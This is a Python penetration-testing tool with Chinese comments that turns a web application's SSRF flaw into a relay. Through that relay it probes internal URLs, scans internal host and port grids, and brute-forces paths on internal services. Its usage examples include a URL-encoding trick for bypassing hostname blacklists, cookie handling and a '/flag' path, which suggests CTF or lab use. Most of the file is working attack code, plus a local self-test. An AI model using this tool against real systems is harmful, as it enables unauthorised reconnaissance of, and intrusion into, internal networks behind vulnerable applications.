#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ssrf_sweep.py — 通用 SSRF 中继探测/扫描/路径爆破工具

背景: 渗透中常遇到"应用存在 SSRF 漏洞, 其 Web 端点(如 /probe)接收 target_url
参数、代为抓取内网资源并把结果(状态、响应头、响应体预览)回显在 HTML 页面里"。
本工具把这一类"SSRF 中继"能力参数化为三种模式:

  probe     单目标探测: 提交一个 URL, 解析并打印回显的状态/响应头/响应体预览
  scan      端口扫描: 对 host×port 网格逐个经 SSRF 端点提交, 按回显状态文本
            分类(OPEN/FILTER/PRIVATE/REFUSED/TIMEOUT/DNSFAIL/OTHER)
  pathbrute 路径爆破: 对指定 host:port 上的候选路径逐个经 SSRF 提交,
            按响应体特征判定 404/命中(默认: 含 "404" 且 "Not Found" 视为 404)

用法示例:
  # 单点探测
  python3 pentools/custom/ssrf_sweep.py probe \
      --ssrf-url http://10.0.167.216:80/probe \
      --target 'http://internal-api:5000/admin' -c 'session=abc123'

  # 内网端口扫描(主机名可 URL 编码绕过黑名单, 如 %69nternal-api)
  python3 pentools/custom/ssrf_sweep.py scan \
      --ssrf-url http://10.0.167.216:80/probe \
      --hosts '%69nternal-api,web,127.0.0.1' \
      --ports 80,443,5000,8000-8010,3306,6379 --concurrency 6

  # 经 SSRF 对内部服务爆破路径(带 cookie jar)
  python3 pentools/custom/ssrf_sweep.py pathbrute \
      --ssrf-url http://10.0.167.216:80/probe \
      --host internal-api --port 5000 \
      --paths /admin,/flag,/api/config -w wordlist.txt -o hits.txt \
      --cookie-jar /tmp/ck.txt

仅使用 Python 标准库; 支持 --selftest 本地自检(不依赖外部网络)。
"""
import argparse
import base64  # noqa: F401 (留作扩展)
import concurrent.futures
import html
import http.server
import os
import re
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

MAX_BODY = 2 * 1024 * 1024  # 单次回显读取上限

# ---------------- HTML 回显解析 ----------------

_ALERT_RE = re.compile(r'<div class="alert alert-([^"]+)">(.*?)</div>', re.S)
_PRE_RE = re.compile(r'<pre[^>]*>(.*?)</pre>', re.S)
_HDR_RE = re.compile(r'header-name">([^<]+)</span>.*?header-item">([^<]*)</span>', re.S)


def strip_html(s):
    """去掉 script/style/标签, HTML 反转义, 压缩空白。"""
    if not s:
        return ''
    s = re.sub(r'<script.*?</script>', ' ', s, flags=re.S | re.I)
    s = re.sub(r'<style.*?</style>', ' ', s, flags=re.S | re.I)
    s = re.sub(r'<[^>]+>', ' ', s)
    s = html.unescape(s)
    return re.sub(r'[ \t]+', ' ', s)


def collapse_ws(s):
    return re.sub(r'\s+', ' ', (s or '')).strip()


def parse_ssrf_response(raw):
    """解析 SSRF 端点回显的 HTML, 返回 dict(status, alert, headers, body)。

    status : alert div 内文本(去掉标签); 无则取整个页面去标签后的文本
    alert  : alert 的 class(danger/success/...), 无则 None
    headers: 从 header-name/header-item 结构尽力提取的响应头 dict
    body   : <pre> 块文本(去标签); 无 <pre> 则取整页去标签文本
    """
    text = raw.decode('utf-8', errors='replace') if isinstance(raw, bytes) else raw
    status, alert = '?', None
    m = _ALERT_RE.search(text)
    if m:
        alert = m.group(1)
        status = collapse_ws(strip_html(m.group(2))) or '?'
    headers = {}
    for k, v in _HDR_RE.findall(text):
        headers.setdefault(k.strip(), v)
    m = _PRE_RE.search(text)
    if m:
        body = collapse_ws(strip_html(m.group(1)))
    else:
        body = collapse_ws(strip_html(text))
    return {'status': status, 'alert': alert, 'headers': headers, 'body': body}


# ---------------- 结果分类 / 404 判定 ----------------

def classify_status(status, body=''):
    """按回显状态文本分类端口开放情况(中英文关键词都覆盖)。
    若状态文本过于笼统(成功/OTHER), 再结合响应体特征细化(拒绝/超时)。
    """
    s = (status or '').lower()
    if not s:
        return 'OTHER:'
    if '成功' in s or 'success' in s or '200 ok' in s:
        cls = 'OPEN'
    elif '访问被阻止' in s or 'blocked' in s:
        cls = 'FILTER'
    elif '禁止访问' in s or 'forbidden' in s or 'private' in s or '内网' in s:
        cls = 'PRIVATE'
    elif '连接错误' in s or 'refused' in s or 'connection error' in s:
        cls = 'REFUSED'
    elif '超时' in s or 'timeout' in s or 'timed out' in s:
        cls = 'TIMEOUT'
    elif '解析' in s or 'resolve' in s or 'dns' in s:
        cls = 'DNSFAIL'
    else:
        cls = 'OTHER:' + (status or '')[:40]
    if cls in ('OPEN',) or cls.startswith('OTHER'):
        b = (body or '').lower()
        if 'refused' in b or 'connection error' in b or 'connect error' in b:
            return 'REFUSED'
        if 'timed out' in b or 'timeout' in b:
            return 'TIMEOUT'
    return cls


def looks_like_404(body, marker=''):
    """判断 SSRF 回显的响应体是否为 404 页。
    默认: 同时包含 '404' 与 'Not Found'(Flask/多数框架默认 404 页);
    提供 --notfound-marker 时以该特征为准。
    """
    b = body or ''
    if marker:
        return marker in b
    return '404' in b and 'not found' in b.lower()


# ---------------- 输入解析 ----------------

def parse_ports(spec):
    """展开端口描述: '80,443,8000-8002' -> [80,443,8000,8001,8002]"""
    out = []
    for part in (spec or '').split(','):
        part = part.strip()
        if not part:
            continue
        if '-' in part:
            a, b = part.split('-', 1)
            lo, hi = int(a), int(b)
            if lo > hi:
                lo, hi = hi, lo
            out.extend(range(lo, hi + 1))
        else:
            out.append(int(part))
    return sorted(set(out))


def load_cookie_jar(path):
    """读取 Netscape 格式 cookie jar(兼容 #HttpOnly_ 前缀), 返回 Cookie 头字符串。"""
    pairs = []
    try:
        with open(path, encoding='utf-8', errors='replace') as f:
            for line in f:
                line = line.strip()
                if line.startswith('#HttpOnly_'):
                    line = line[len('#HttpOnly_'):]
                elif not line or line.startswith('#'):
                    continue
                parts = line.split('\t')
                if len(parts) >= 7:
                    pairs.append((parts[5], parts[6]))
    except OSError:
        return ''
    return '; '.join('%s=%s' % (k, v) for k, v in pairs)


def build_cookie(cookie_str, jar_path):
    parts = []
    if cookie_str:
        parts.append(cookie_str)
    if jar_path:
        j = load_cookie_jar(jar_path)
        if j:
            parts.append(j)
    return '; '.join(p for p in parts if p)


# ---------------- SSRF 请求 ----------------

def ssrf_fetch(ssrf_url, target_url, timeout, cookie='', extra_fields=None,
               method='POST', target_field='target_url', timeout_field='timeout',
               req_timeout=None):
    """经 SSRF 端点提交 target_url, 返回 parse_ssrf_response 的结果。"""
    req_timeout = req_timeout or (timeout + 15)
    fields = {target_field: target_url, timeout_field: str(timeout)}
    for kv in (extra_fields or []):
        if '=' in kv:
            k, v = kv.split('=', 1)
            fields[k] = v
    if method == 'GET':
        url = ssrf_url + ('&' if '?' in ssrf_url else '?') + urllib.parse.urlencode(fields)
        req = urllib.request.Request(url, method='GET')
    else:
        data = urllib.parse.urlencode(fields).encode()
        req = urllib.request.Request(ssrf_url, data=data, method='POST')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    if cookie:
        req.add_header('Cookie', cookie)
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))  # 忽略代理环境变量
    try:
        with opener.open(req, timeout=req_timeout) as resp:
            raw = resp.read(MAX_BODY)
    except urllib.error.HTTPError as e:
        raw = e.read(MAX_BODY)  # 部分实现用非 2xx 回传结果
    return parse_ssrf_response(raw)


# ---------------- 子命令实现 ----------------

def _worker_fetch(args, cookie, target_url):
    if args.delay:
        time.sleep(args.delay)
    return ssrf_fetch(args.ssrf_url, target_url, args.timeout, cookie,
                      args.extra_field, args.method, args.target_field,
                      args.timeout_field, args.req_timeout or (args.timeout + 15))


def cmd_probe(args, cookie):
    target = args.target
    r = _worker_fetch(args, cookie, target)
    print('[%s] %s' % (r['alert'] or '?', r['status']))
    for k, v in r['headers'].items():
        print('  %s = %s' % (k, v[:200]))
    print('  [body] ' + r['body'][:args.preview_len].replace('\n', ' '))
    return 0


def cmd_scan(args, cookie):
    hosts = [h.strip() for h in args.hosts.split(',') if h.strip()]
    ports = parse_ports(args.ports)
    total = len(hosts) * len(ports)
    print('[*] scanning %d hosts x %d ports = %d targets' % (len(hosts), len(ports), total),
          file=sys.stderr)
    jobs = [(h, p) for h in hosts for p in ports]
    found = 0

    def job(item):
        host, port = item
        url = '%s://%s:%d/' % (args.scheme, host, port)
        try:
            r = _worker_fetch(args, cookie, url)
            return (host, port, classify_status(r['status'], r['body']), r['status'], r['body'])
        except Exception as e:
            return (host, port, 'ERR', str(e)[:80], '')

    with concurrent.futures.ThreadPoolExecutor(max_workers=max(1, args.concurrency)) as ex:
        for host, port, cls, status, body in ex.map(job, jobs):
            if cls == 'ERR':
                if args.show == 'all':
                    print('[ERR] %s:%d | %s' % (host, port, status), flush=True)
                continue
            if args.show == 'open' and cls != 'OPEN':
                continue
            found += 1
            print('[%s] %s:%d | %s | %s' % (cls, host, port, status[:80], body[:args.preview_len]),
                  flush=True)
    print('[*] done, %d shown' % found, file=sys.stderr)
    return 0


def cmd_pathbrute(args, cookie):
    paths = [p.strip() for p in args.paths.split(',') if p.strip()]
    if args.wordlist:
        try:
            with open(args.wordlist, encoding='utf-8', errors='replace') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        paths.append(line)
        except OSError as e:
            print('[!] cannot read wordlist: %s' % e, file=sys.stderr)
    # 去重保序
    seen, uniq = set(), []
    for p in paths:
        if p not in seen:
            seen.add(p)
            uniq.append(p)
    paths = uniq
    print('[*] probing %d paths on %s:%d' % (len(paths), args.host, args.port), file=sys.stderr)
    found = 0
    out_f = None
    if args.output:
        out_f = open(args.output, 'w', encoding='utf-8')

    def job(path):
        url = '%s://%s:%d%s' % (args.scheme, args.host, args.port,
                                path if path.startswith('/') else '/' + path)
        try:
            r = _worker_fetch(args, cookie, url)
            return (path, r['status'], r['body'])
        except Exception as e:
            return (path, 'ERR:' + str(e)[:60], '')

    with concurrent.futures.ThreadPoolExecutor(max_workers=max(1, args.concurrency)) as ex:
        for path, status, body in ex.map(job, paths):
            if status.startswith('ERR'):
                print('[!] %s | %s' % (path, status), file=sys.stderr)
                continue
            if looks_like_404(body, args.notfound_marker):
                continue
            found += 1
            line = '[HIT] %s :: %s :: %s' % (path, status[:80], body[:args.preview_len])
            print(line, flush=True)
            if out_f:
                out_f.write(line + '\n')
    if out_f:
        out_f.close()
    print('[*] done, %d hits' % found, file=sys.stderr)
    return 0


# ---------------- 自检 ----------------

class _SSRFHandler(http.server.BaseHTTPRequestHandler):
    """本地模拟 SSRF 端点: 解析 target_url/timeout 表单并回显 HTML。"""

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0) or 0)
        body = self.rfile.read(length).decode('utf-8', 'replace')
        fields = urllib.parse.parse_qs(body)
        target = (fields.get('target_url') or [''])[0]
        tout = (fields.get('timeout') or [''])[0]
        page = ('<html><body>'
                '<div class="alert alert-success">探测成功 %s timeout=%s</div>'
                '<div class="mb-2"><span class="header-name">Server</span>:</div>'
                '<div class="mb-2"><span class="header-item">local-test</span></div>'
                '<pre>MAGIC-BODY:%s</pre>'
                '</body></html>') % (target, tout, target)
        data = page.encode('utf-8')
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, *a):  # 静默
        pass


def selftest():
    # 1) HTML 回显解析
    page = ('<html><body>'
            '<div class="alert alert-success">探测成功 200 OK</div>'
            '<div class="mb-2"><span class="header-name">Server</span>:</div>'
            '<div class="mb-2"><span class="header-item">nginx</span></div>'
            '<pre>HELLO 世界</pre></body></html>')
    r = parse_ssrf_response(page)
    assert r['alert'] == 'success' and '200 OK' in r['status'], r
    assert r['headers'].get('Server') == 'nginx', r
    assert r['body'] == 'HELLO 世界', r
    # 无 <pre> 时回退整页去标签
    r2 = parse_ssrf_response('<html><body>plain result 200 OK</body></html>')
    assert 'plain result' in r2['body'], r2

    # 2) 状态分类(中英文)
    assert classify_status('探测成功') == 'OPEN'
    assert classify_status('Success: 200 OK') == 'OPEN'
    # 状态文本笼统时用响应体细化
    assert classify_status('探测成功', 'Connection refused') == 'REFUSED'
    assert classify_status('探测成功', 'request timed out') == 'TIMEOUT'
    assert classify_status('访问被阻止') == 'FILTER'
    assert classify_status('禁止访问内网') == 'PRIVATE'
    assert classify_status('连接错误 Connection refused') == 'REFUSED'
    assert classify_status('请求超时') == 'TIMEOUT'
    assert classify_status('域名解析失败') == 'DNSFAIL'
    assert classify_status('weird message') == 'OTHER:weird message'

    # 3) 404 判定
    assert looks_like_404('<!DOCTYPE HTML><title>404 Not Found</title>The requested URL was not found')
    assert not looks_like_404('{"status":"ok","data":[]}')
    assert looks_like_404('page contains FLAG here', marker='FLAG')
    assert not looks_like_404('no marker in page', marker='FLAG')

    # 4) 端口描述展开
    assert parse_ports('80,443,8000-8002') == [80, 443, 8000, 8001, 8002]
    assert parse_ports('9000') == [9000]

    # 5) Netscape cookie jar 解析
    import tempfile
    with tempfile.NamedTemporaryFile('w', suffix='.txt', delete=False) as tf:
        tf.write('# Netscape HTTP Cookie File\n'
                 '#HttpOnly_.example.com\tTRUE\t/\tFALSE\t0\tsess\tabc123\n'
                 '.example.com\tTRUE\t/\tFALSE\t0\tuid\t42\n')
        jar = tf.name
    ck = load_cookie_jar(jar)
    os.unlink(jar)
    assert 'sess=abc123' in ck and 'uid=42' in ck, ck

    # 6) 端到端: 本地模拟 SSRF 端点 + ssrf_fetch
    srv = http.server.ThreadingHTTPServer(('127.0.0.1', 0), _SSRFHandler)
    port = srv.server_address[1]
    t = threading.Thread(target=srv.handle_request, daemon=True)
    t.start()
    rr = ssrf_fetch('http://127.0.0.1:%d/probe' % port,
                    'http://internal:5000/admin', 3,
                    cookie='sess=abc123')
    t.join(timeout=10)
    srv.server_close()
    assert rr['alert'] == 'success', rr
    assert '探测成功' in rr['status'] and 'timeout=3' in rr['status'], rr
    assert rr['headers'].get('Server') == 'local-test', rr
    assert rr['body'] == 'MAGIC-BODY:http://internal:5000/admin', rr

    print('[selftest] PASS: html parsing, classification, 404 detect, ports, cookie jar, e2e fetch')
    return True


# ---------------- 入口 ----------------

def build_parser():
    p = argparse.ArgumentParser(prog='ssrf_sweep', description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument('--selftest', action='store_true', help='本地自检(不依赖外部网络)')
    sub = p.add_subparsers(dest='mode', metavar='{probe,scan,pathbrute}')

    common = argparse.ArgumentParser(add_help=False)
    common.add_argument('--ssrf-url', required=True, help='SSRF 端点完整 URL(如 http://host/probe)')
    common.add_argument('-c', '--cookie', default='', help='Cookie 头字符串')
    common.add_argument('--cookie-jar', default='', help='Netscape 格式 cookie jar 文件(兼容 #HttpOnly_ 前缀)')
    common.add_argument('--timeout', type=float, default=3.0, help='SSRF 端点内部抓取超时(秒), 随表单提交')
    common.add_argument('--req-timeout', type=float, default=0, help='SSRF 请求本身超时(秒), 默认 --timeout+15')
    common.add_argument('--concurrency', type=int, default=4, help='并发线程数')
    common.add_argument('--delay', type=float, default=0.0, help='每个目标提交前延时(秒)')
    common.add_argument('--preview-len', type=int, default=200, help='响应体预览长度')
    common.add_argument('--target-field', default='target_url', help='SSRF 端点接收目标 URL 的表单字段名')
    common.add_argument('--timeout-field', default='timeout', help='SSRF 端点接收超时的表单字段名')
    common.add_argument('--extra-field', action='append', default=[], metavar='K=V', help='额外表单字段(可多次)')
    common.add_argument('--method', choices=['POST', 'GET'], default='POST', help='向 SSRF 端点提交的方式')

    pp = sub.add_parser('probe', parents=[common], help='单目标探测: 提交一个 URL 并打印回显')
    pp.add_argument('--target', required=True, help='要探测的目标 URL')

    ps = sub.add_parser('scan', parents=[common], help='host×port 网格扫描并按回显分类')
    ps.add_argument('--hosts', default='127.0.0.1,localhost', help='逗号分隔主机列表(可含 URL 编码绕过)')
    ps.add_argument('--ports', default='80,443,5000,8000,8080,3000,3306,6379,27017,9200,22',
                    help='逗号分隔端口或范围(如 8000-8010)')
    ps.add_argument('--scheme', default='http', help='目标 URL scheme')
    ps.add_argument('--show', choices=['open', 'all'], default='open',
                    help='open=只显示 OPEN; all=显示所有分类')

    pb = sub.add_parser('pathbrute', parents=[common], help='对内部 host:port 爆破路径(按响应体判 404)')
    pb.add_argument('--host', required=True, help='内部目标主机')
    pb.add_argument('--port', type=int, required=True, help='内部目标端口')
    pb.add_argument('--scheme', default='http', help='目标 URL scheme')
    pb.add_argument('--paths', default='', help='逗号分隔路径(须以 / 开头)')
    pb.add_argument('-w', '--wordlist', default='', help='词表文件(每行一个路径)')
    pb.add_argument('--notfound-marker', default='', help='自定义 404 特征; 默认: 响应体含 404 且 Not Found')
    pb.add_argument('-o', '--output', default='', help='命中结果写入文件')
    return p


def main():
    parser = build_parser()
    args = parser.parse_args()
    if args.selftest:
        return 0 if selftest() else 1
    if not args.mode:
        parser.print_help()
        return 2
    cookie = build_cookie(args.cookie, args.cookie_jar)
    if args.mode == 'probe':
        return cmd_probe(args, cookie)
    if args.mode == 'scan':
        return cmd_scan(args, cookie)
    if args.mode == 'pathbrute':
        return cmd_pathbrute(args, cookie)
    return 2


if __name__ == '__main__':
    sys.exit(main())
